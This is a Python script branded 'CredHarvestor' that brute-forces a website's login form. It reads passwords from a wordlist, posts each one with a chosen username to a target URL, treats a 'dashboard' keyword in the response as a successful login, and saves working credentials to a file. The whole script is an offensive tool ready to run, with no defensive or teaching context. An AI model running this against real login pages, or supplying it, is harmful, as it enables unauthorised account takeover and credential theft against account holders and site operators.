import requests
import time
from colorama import Fore, Style

# Configuration
target_url = "https://example.com/login"  # Replace with actual target
username = input("Enter target username/email: ")
password_file = "passwords.txt"
success_keyword = "dashboard"  # Keyword in response upon success

headers = {
    'User-Agent': 'Mozilla/5.0'
}

def try_login(password):
    data = {
        'username': username,
        'password': password
    }

    try:
        response = requests.post(target_url, data=data, headers=headers, timeout=10)
        if success_keyword.lower() in response.text.lower():
            print(Fore.GREEN + f"[+] Success: {username}:{password}" + Style.RESET_ALL)
            with open("successful.txt", "a") as f:
                f.write(f"{username}:{password}\n")
            return True
        else:
            print(Fore.RED + f"[-] Failed: {password}" + Style.RESET_ALL)
            return False
    except Exception as e:
        print(Fore.YELLOW + f"[!] Error: {e}" + Style.RESET_ALL)
        return False

def banner():
    print(Fore.CYAN + r"""
   ____                _   _                           __             
  / ___|___  ___ _ __ | |_(_) ___  _ __   ___ _ __    / /  ___   __ _ 
 | |   / _ \/ _ \ '_ \| __| |/ _ \| '_ \ / _ \ '__|  / /  / _ \ / _` |
 | |__|  __/  __/ | | | |_| | (_) | | | |  __/ |    / /__| (_) | (_| |
  \____\___|\___|_| |_|\__|_|\___/|_| |_|\___|_|   /_____\___/ \__, |
                                                              |___/ 
         🔐 CredHarvestor by KRISHNA ⚔️
    """)
    print(Style.RESET_ALL)

def main():
    banner()
    with open(password_file, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        pwd = password.strip()
        if try_login(pwd):
            break
        time.sleep(0.5)

if __name__ == "__main__":
    main()
